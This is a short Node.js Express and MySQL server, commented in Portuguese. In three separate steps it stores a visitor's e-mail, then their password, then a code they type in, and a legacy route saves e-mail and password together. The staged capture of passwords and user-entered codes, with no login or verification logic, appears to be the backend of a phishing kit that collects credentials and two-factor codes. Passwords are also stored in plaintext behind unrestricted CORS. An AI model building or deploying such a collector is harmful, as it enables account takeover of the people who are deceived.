const express = require('express');
const mysql   = require('mysql2/promise');
const cors    = require('cors');
const path    = require('path');

const app  = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const db = mysql.createPool(process.env.MYSQL_URL || {
  host:     process.env.MYSQLHOST     || 'localhost',
  port:     process.env.MYSQLPORT     || 3306,
  user:     process.env.MYSQLUSER     || 'root',
  password: process.env.MYSQLPASSWORD || '',
  database: process.env.MYSQLDATABASE || 'cadastro_db'
});

/* Garante tabela com todas as colunas */
async function initDB() {
  await db.query(`
    CREATE TABLE IF NOT EXISTS usuarios (
      id        INT AUTO_INCREMENT PRIMARY KEY,
      email     VARCHAR(255),
      senha     VARCHAR(255),
      codigo    VARCHAR(10),
      criado_em DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);
  for (const col of ['senha','codigo']) {
    try { await db.query(`ALTER TABLE usuarios ADD COLUMN ${col} VARCHAR(255)`); }
    catch (e) { /* coluna já existe */ }
  }
  console.log('Banco pronto.');
}
initDB();

/* Etapa 1 — salva e-mail */
app.post('/salvar-email', async (req, res) => {
  const { email } = req.body;
  if (!email) return res.status(400).json({ mensagem: 'E-mail obrigatório.' });
  try {
    await db.query('INSERT INTO usuarios (email) VALUES (?)', [email]);
    return res.json({ mensagem: 'E-mail salvo.' });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ mensagem: 'Erro interno.' });
  }
});

/* Etapa 2 — atualiza senha */
app.post('/salvar-senha', async (req, res) => {
  const { email, senha } = req.body;
  if (!email || !senha) return res.status(400).json({ mensagem: 'Dados incompletos.' });
  try {
    await db.query(
      'UPDATE usuarios SET senha = ? WHERE email = ? ORDER BY id DESC LIMIT 1',
      [senha, email]
    );
    return res.json({ mensagem: 'Senha salva.' });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ mensagem: 'Erro interno.' });
  }
});

/* Etapa 3 — atualiza código */
app.post('/salvar-codigo', async (req, res) => {
  const { email, codigo } = req.body;
  if (!email || !codigo) return res.status(400).json({ mensagem: 'Dados incompletos.' });
  try {
    await db.query(
      'UPDATE usuarios SET codigo = ? WHERE email = ? ORDER BY id DESC LIMIT 1',
      [codigo, email]
    );
    return res.json({ mensagem: 'Código salvo.' });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ mensagem: 'Erro interno.' });
  }
});

/* Rota legada mantida */
app.post('/cadastrar', async (req, res) => {
  const { email, senha } = req.body;
  if (!email || !senha) return res.status(400).json({ mensagem: 'Preencha todos os campos.' });
  try {
    await db.query('INSERT INTO usuarios (email, senha) VALUES (?, ?)', [email, senha]);
    return res.json({ mensagem: 'Salvo com sucesso!' });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ mensagem: 'Erro interno.' });
  }
});

app.listen(PORT, () => console.log('Servidor rodando na porta ' + PORT));
